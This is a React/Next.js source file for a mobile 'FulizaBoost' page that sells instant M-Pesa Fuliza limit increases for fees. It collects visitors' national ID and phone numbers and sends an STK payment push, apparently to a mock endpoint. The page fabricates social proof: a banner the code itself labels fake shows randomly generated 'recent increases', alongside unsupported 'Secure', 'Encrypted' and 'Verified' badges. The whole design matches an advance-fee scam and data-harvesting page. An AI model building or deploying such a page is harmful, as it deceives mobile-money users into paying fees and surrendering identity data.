'use client';
// src/app/page.tsx start cd C:\Users\GIDEON\my-fuliza-analysis
//npm run dev
//git add .
//git commit -m "your descriptive message here"
//git push
import React from 'react';

function formatKsh(amount: number): string {
  return `Ksh ${amount.toLocaleString('en-KE')}`;
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateMaskedPhone(): string {
  const prefix = `07${randomInt(0, 9)}`;
  const suffix = `${randomInt(0, 9)}${randomInt(0, 9)}`;
  return `${prefix}${randomInt(0, 9)}****${suffix}`;
}

export default function FulizaBoostPage() {
  const limits = React.useMemo(
    () => [
      { amount: 5000, fee: 1 },
      { amount: 7500, fee: 159 },
      { amount: 10000, fee: 159 },
      { amount: 12500, fee: 159 },
      { amount: 16000, fee: 159 },
      { amount: 21000, fee: 289 },
      { amount: 25500, fee: 309 },
      { amount: 30000, fee: 449 },
      { amount: 35000, fee: 520 },
      { amount: 40000, fee: 620 },
      { amount: 45000, fee: 770 },
      { amount: 50000, fee: 990 },
      { amount: 60000, fee: 1100 },
      { amount: 70000, fee: 1600 },
    ],
    []
  );

  const [selectedAmount, setSelectedAmount] = React.useState(limits[0]?.amount ?? 0);
  const selectedOption = React.useMemo(
    () => limits.find((opt) => opt.amount === selectedAmount) ?? null,
    [limits, selectedAmount]
  );

  const [isModalOpen, setModalOpen] = React.useState(false);
  const [idNumber, setIdNumber] = React.useState('');
  const [phoneNumber, setPhoneNumber] = React.useState('');
  const [isLoading, setLoading] = React.useState(false);
  const [errorMsg, setErrorMsg] = React.useState<string | null>(null);
  const [successMsg, setSuccessMsg] = React.useState<string | null>(null);

  // Remove the random init from useState
const [recentIncrease, setRecentIncrease] = React.useState({
  phone: '07XX****XX', // placeholder (shows during SSR)
  amount: 0,
});

// Generate real random values ONLY after mount (client-only)
React.useEffect(() => {
  setRecentIncrease({
    phone: generateMaskedPhone(),
    amount: limits[randomInt(0, limits.length - 1)]?.amount ?? 16400,
  });

  // Also start the interval here
  const interval = setInterval(() => {
    setRecentIncrease({
      phone: generateMaskedPhone(),
      amount: limits[randomInt(0, limits.length - 1)]?.amount ?? 16400,
    });
  }, 2000);

  return () => clearInterval(interval);
}, [limits]); // ← dependency on limits

  const fee = selectedOption?.fee ?? 0;
  const isValid = idNumber.trim().length > 3 && phoneNumber.replace(/\D/g, '').length >= 9;

  function handleCloseModal() {
    if (!isLoading) setModalOpen(false);
  }

  async function handleSubmit() {
    if (!selectedOption || !isValid || isLoading) return;

    setErrorMsg(null);
    setSuccessMsg(null);

    const cleanedPhone = phoneNumber.replace(/\D/g, '');
    const payload = {
      phone: cleanedPhone.startsWith('254')
        ? cleanedPhone
        : cleanedPhone.startsWith('0')
        ? `254${cleanedPhone.slice(1)}`
        : `254${cleanedPhone}`,
      amount: selectedOption.fee,
      apiRef: idNumber.trim() || `ref-${Date.now()}`,
    };

    setLoading(true);

    try {
      const res = await fetch('/api/mock-stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (!res.ok || !data?.ok) {
        throw new Error(data?.error || 'Failed to initiate STK push');
      }

      setSuccessMsg('STK push sent. Please check your phone to complete payment.');
    } catch (err: any) {
      setErrorMsg(err.message || 'An error occurred');
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-sky-50 to-sky-100">
      <main className="mx-auto flex w-full max-w-sm flex-col gap-3 px-4 pb-10 pt-4">
        {/* Header */}
        <header className="flex flex-col items-center gap-1">
          <div className="text-xl font-semibold tracking-tight text-blue-700">FulizaBoost</div>
          <div className="text-center text-[11px] text-slate-500">
            Instant Limit Increase - No Paperwork - Same Day Access
          </div>
        </header>

        {/* Info banner */}
        <section className="rounded-xl border border-blue-100 bg-white/70 px-4 py-3 shadow-sm backdrop-blur">
          <div className="flex items-start gap-2">
            <div className="mt-0.5 flex h-6 w-6 items-center justify-center rounded-full bg-blue-600 text-white">
              <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 5v14" />
                <path d="M5 12h14" />
              </svg>
            </div>
            <div className="text-center text-[12px] leading-4 text-slate-600">
              Choose your new Fuliza limit and complete the payment to get instant access.
            </div>
          </div>
        </section>

        {/* Fake recent increases */}
        <section className="rounded-xl bg-gradient-to-r from-emerald-50 to-sky-50 px-4 py-3 shadow-sm ring-1 ring-slate-200">
          <div className="flex items-center gap-2 text-[12px] text-slate-700">
            <div className="flex h-6 w-6 items-center justify-center rounded-full bg-emerald-100 text-emerald-700">
              <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M4 12h10" />
                <path d="M10 6l6 6-6 6" />
              </svg>
            </div>
            <div className="flex-1">
              <span className="font-semibold text-blue-700">Recent increases</span>
              <div className="text-[11px] text-slate-600">
                {recentIncrease.phone} increased to {formatKsh(recentIncrease.amount)} - just now
              </div>
            </div>
          </div>
        </section>

        {/* Limit selection */}
        <section className="rounded-2xl bg-white shadow-sm ring-1 ring-slate-200">
          <div className="border-t-4 border-blue-600 px-4 pb-4 pt-4">
            <div className="flex items-center gap-2">
              <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-blue-50 text-blue-700">
                <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M4 7h16" />
                  <path d="M4 17h16" />
                  <path d="M7 11h10" />
                </svg>
              </div>
              <div className="text-sm font-semibold text-blue-700">Select Your Fuliza Limit</div>
            </div>

            <div className="mt-4 grid grid-cols-2 gap-3">
              {limits.map((opt) => {
                const isSelected = opt.amount === selectedAmount;
                return (
                  <button
                    key={opt.amount}
                    type="button"
                    onClick={() => setSelectedAmount(opt.amount)}
                    className={`rounded-xl border bg-white px-3 py-3 text-left shadow-sm transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500/40 ${
                      isSelected ? 'border-blue-600 ring-2 ring-blue-600/20' : 'border-slate-200 hover:border-slate-300'
                    }`}
                  >
                    <div className="text-xs font-semibold text-blue-700">{formatKsh(opt.amount)}</div>
                    <div className="mt-1 inline-flex rounded-full bg-slate-100 px-2 py-0.5 text-[10px] text-slate-600">
                      Fee: Ksh {opt.fee.toLocaleString('en-KE')}
                    </div>
                  </button>
                );
              })}
            </div>

            <button
              type="button"
              onClick={() => {
                setErrorMsg(null);
                setSuccessMsg(null);
                setModalOpen(true);
              }}
              className="mt-5 flex w-full items-center justify-center gap-2 rounded-full bg-blue-500 px-4 py-3 text-sm font-semibold text-white shadow-sm transition-colors hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500/40"
            >
              <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M13 3L4 14h7l-1 7 10-11h-7l0-7z" />
              </svg>
              {selectedOption ? `Get ${formatKsh(selectedOption.amount)} Now` : 'Get Limit Now'}
            </button>

            {selectedOption && (
              <div className="mt-3 text-center text-[11px] text-slate-500">
                Selected: {formatKsh(selectedOption.amount)} • Fee: Ksh {selectedOption.fee.toLocaleString('en-KE')}
              </div>
            )}
          </div>
        </section>

        {/* Badges */}
        <section className="grid grid-cols-2 gap-3 pt-1">
          <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
            <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-sky-100 text-sky-700">
              <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z" />
              </svg>
            </span>
            Secure
          </div>

          <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
            <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-sky-100 text-sky-700">
              <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M7 11V7a5 5 0 0110 0v4" />
                <path d="M5 11h14v10H5z" />
              </svg>
            </span>
            Encrypted
          </div>

          <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
            <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-sky-100 text-sky-700">
              <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 2v10" />
                <path d="M6 12l6 6 6-6" />
              </svg>
            </span>
            Instant
          </div>

          <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
            <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-sky-100 text-sky-700">
              <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M20 6L9 17l-5-5" />
              </svg>
            </span>
            Verified
          </div>
        </section>

        {/* Modal */}
        {isModalOpen && (
          <div className="fixed inset-0 z-50 flex items-end justify-center px-4 pb-6 pt-10 sm:items-center sm:pb-10">
            <button
              type="button"
              aria-label="Close"
              onClick={handleCloseModal}
              className="absolute inset-0 bg-slate-900/40 backdrop-blur-sm"
            />

            <div className="relative w-full max-w-sm rounded-2xl bg-white p-5 shadow-xl ring-1 ring-slate-200">
              <div className="flex flex-col items-center">
                <div className="flex h-16 w-16 items-center justify-center rounded-full border-4 border-sky-200 text-sky-500">
                  <svg viewBox="0 0 24 24" className="h-8 w-8" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 18h.01" />
                    <path d="M12 14a4 4 0 10-4-4" />
                    <path d="M12 10V6" />
                  </svg>
                </div>
                <div className="mt-3 text-lg font-semibold text-blue-700">Enter Your Details</div>
                <div className="mt-2 flex items-center gap-2 text-sm text-slate-600">
                  <svg viewBox="0 0 24 24" className="h-4 w-4 text-slate-500" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                  Provide your details to proceed
                </div>
              </div>

              <div className="mt-5">
                <div className="mb-1 flex items-center gap-2 text-sm font-semibold text-blue-700">
                  <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M4 7h16" />
                    <path d="M4 17h16" />
                    <path d="M7 11h10" />
                  </svg>
                  ID Number
                </div>
                <input
                  value={idNumber}
                  onChange={(e) => setIdNumber(e.target.value)}
                  placeholder="Enter your ID number"
                  inputMode="numeric"
                  className="w-full rounded-xl border border-slate-200 px-4 py-3 text-sm text-slate-800 shadow-sm outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20"
                />

                <div className="mt-4">
                  <div className="mb-1 flex items-center gap-2 text-sm font-semibold text-blue-700">
                    <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M7 4h10v16H7z" />
                      <path d="M11 5h2" />
                      <path d="M12 17h.01" />
                    </svg>
                    Phone Number
                  </div>
                  <div className="flex overflow-hidden rounded-xl border border-slate-200 shadow-sm focus-within:border-blue-500 focus-within:ring-2 focus-within:ring-blue-500/20">
                    <div className="flex items-center justify-center bg-slate-50 px-4 text-sm font-semibold text-slate-700">
                      +254
                    </div>
                    <input
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="712 345 678"
                      inputMode="numeric"
                      className="min-w-0 flex-1 px-4 py-3 text-sm text-slate-800 outline-none"
                    />
                  </div>
                </div>

                <div className="mt-4 rounded-xl bg-slate-50 px-4 py-3 text-sm text-slate-600">
                  <div className="flex items-start gap-2">
                    <svg viewBox="0 0 24 24" className="mt-0.5 h-4 w-4 text-slate-500" fill="none" stroke="currentColor" strokeWidth="2">
                      <circle cx="12" cy="12" r="10" />
                      <path d="M12 16v-4" />
                      <path d="M12 8h.01" />
                    </svg>
                    <div>
                      We'll send an M-Pesa STK push to your phone number for payment
                      {fee ? ` (Fee: Ksh ${fee.toLocaleString('en-KE')})` : ''}.
                    </div>
                  </div>
                </div>

                {errorMsg && (
                  <div className="mt-4 rounded-xl bg-rose-50 px-4 py-3 text-sm text-rose-700 ring-1 ring-rose-200">
                    {errorMsg}
                  </div>
                )}

                {successMsg && (
                  <div className="mt-4 rounded-xl bg-emerald-50 px-4 py-3 text-sm text-emerald-700 ring-1 ring-emerald-200">
                    {successMsg}
                  </div>
                )}

                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!isValid || isLoading || !!successMsg}
                  className={`mt-6 w-full rounded-xl px-4 py-3 text-sm font-semibold text-white shadow-sm transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500/40 ${
                    !isValid || isLoading || successMsg ? 'bg-blue-300 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
                  }`}
                >
                  {isLoading ? 'Processing...' : successMsg ? 'Sent' : 'Continue'}
                </button>

                <button
                  type="button"
                  onClick={handleCloseModal}
                  disabled={isLoading}
                  className={`mt-3 w-full rounded-xl border px-4 py-3 text-sm font-semibold shadow-sm transition-colors ${
                    isLoading
                      ? 'cursor-not-allowed border-slate-200 bg-white text-slate-400'
                      : 'border-slate-200 bg-white text-slate-700 hover:bg-slate-50'
                  }`}
                >
                  {successMsg ? 'Close' : 'Cancel'}
                </button>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}